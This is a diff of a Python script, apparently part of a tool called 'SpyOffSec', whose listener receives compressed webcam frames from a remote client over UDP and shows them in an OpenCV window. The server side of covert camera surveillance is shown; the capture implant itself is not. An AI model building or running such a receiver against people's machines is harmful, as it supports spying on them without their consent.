@@ -2,7 +2,7 @@
 
 '''
 	@Author: Daniel Victor Freire Feitosa
-	@Version: 2.0.0
+	@Version: 1.1.0
 
 	Github: https://github.com/proxyanon/
 	Twiiter: @DanielFreire00
@@ -13,47 +13,55 @@
 '''
 
 import cv2, socket
-from sys import exit, stdout
 from zlib import decompress
+from sys import exit, stdout
+from platform import system
 
-class SpyOffSec():
+class App():
 
-	def __init__(self, ip, port, img_name='frame.jpg'):
-		self.ip = ip # ip para conexao do socket
-		self.port = int(port) # porta para conexao do socket
-		self.img_name = img_name # nome do frame
+	def __init__(self, ip, port, image_name='frame.jpg'):
+		self.ip = ip # IP para o servidor
+		self.port = port # Porta para o servidor
+		self.image_name = image_name # Nome qualquer para o frame
 
-	def decompress_and_save(self, string):
-		decompressed = decompress(decompress(decompress(decompress(string))))
-		handle = open(self.img_name, 'wb')
-		handle.write(decompressed)
-		handle.close()
+	def decompressStringAndSave(self, string_image): # Essa funcao extrai e salva o frame em um imagem
+		decompressed = decompress(decompress(string_image)) # Extrai o frame
+		handle = open(self.image_name, 'wb') # Abri a imagem no modo binario
+		handle.write(decompressed) # Escreve o frame extraido
+		handle.close() # Fecha o frame salvo
 
-	def run(self):
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.bind((self.ip, self.port))
-		s.listen(5)
+	def run(self): # Essa eh a funcao principal
+		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # Cria o socket UDP
+		s.bind((self.ip, self.port)) # Inicia o servidor
 
 		while True:
+			data, addr = s.recvfrom(1024) # Recebe o tamanho do frame
 
-			sock, addr = s.accept()
-			data = sock.recv(1024)
+			if "LEN:" in data: # Se for o tamanho
+				packet_size = int(data.split(":")[1]) # Pega o tamanho do frame no formato enviado do cliente
+				s.sendto("OK", addr) # Envia um OK para poder receber o frame
 
-			if "LEN:" in data:
-				packet_size = int(data.split(":")[1])
-				sock.send("OK")
+				data_, addr_ = s.recvfrom(packet_size) # Recebe o frame
+				string_image = data_ # Frame
 
-				stdout.write("\rRecebendo: {packet_size}".format(packet_size=packet_size))
+				stdout.write("\rTrasmitindo ....: {nbytes} bytes".format(nbytes=len(data_)))
 
-				img_recv = sock.recv(packet_size)
-				self.decompress_and_save(img_recv)
+				if string_image == "FAIL": break # Se receber um FAIL sai do loop
+			else: # Se nao for o tamanho
+				s.sendto("FAIL", addr) # Envia um FAIL e sai do loop
+				break
 
-				frame = cv2.imread(self.img_name, 0) # faz a leitura da imagem
-				cv2.imshow('SpyOffSec TCP - por Daniel Victor Freire Feitosa', frame)
-				key = cv2.waitKey(113)
+			self.decompressStringAndSave(string_image) # Extrai e salva o frame em um imagem
+			image = cv2.imread(self.image_name, 0) # Ler o frame com o opencv
+			cv2.imshow('SpyOffSec UDP - por Daniel Victor Freire Feitosa', image) # Mostra o frame
 
-			else:
-				pass
+			key = cv2.waitKey(113) # Espeara a entrada da tecla q
+			if key == 113: # Se for entrada a q
+				s.sendto("EXIT", addr_) # Envia um EXIT para o cliente
+				s.close() # Fecha o socket
+				break # Sai do loop
+		cv2.destroyAllWindows() # Destroi as janelas do opencv
+		exit() # Sai do programa
 
 
 # banner
@@ -62,13 +70,17 @@ print("/\\ \\ ___\\   /\\  == \\ /\\ \\_\\ \\   /\\  __ \\   /\\  ___\\ /\\  ___
 print("\\ \\___  \\  \\ \\  _-/ \\ \\____ \\  \\ \\ \\/\\ \\  \\ \\  __\\ \\ \\  __\\ \\ \\___  \\  \\ \\  __\\   \\ \\ \\____ ") 
 print(" \\/\\_____\\  \\ \\_\\    \\/\\_____\\  \\ \\_____\\  \\ \\_\\    \\ \\_\\    \\/\\_____\\  \\ \\_____\\  \\ \\_____\\") 
 print("  \\/_____/   \\/_/     \\/_____/   \\/_____/   \\/_/     \\/_/     \\/_____/   \\/_____/   \\/_____/ \n")
+                                                                                             
 
-app = SpyOffSec('0.0.0.0', 8291)
-print("Escutando tcp://{ip}:{port}\n".format(ip=app.ip, port=app.port))
+if system() != 'Windows':
+	print("[#] Provalvemente este programa nao vai rodar perfeitamente no {plataforma} ...\n".format(plataforma=system()))
+
+app = App('192.168.1.62', 8291) # Cria a classe App com as configuracoes do servidor
+print("Escutando: udp://{ip}:{port}\n".format(ip=app.ip, port=app.port)) # auto-explicativo
 
 try:
-	while True:
-		app.run()
+	while True: # Enquanto estiver tudo certo
+		app.run() # Vai receber e mostrar os frames
 except KeyboardInterrupt:
 	print("\nEncerrando transmissao ...\n")
 	exit()
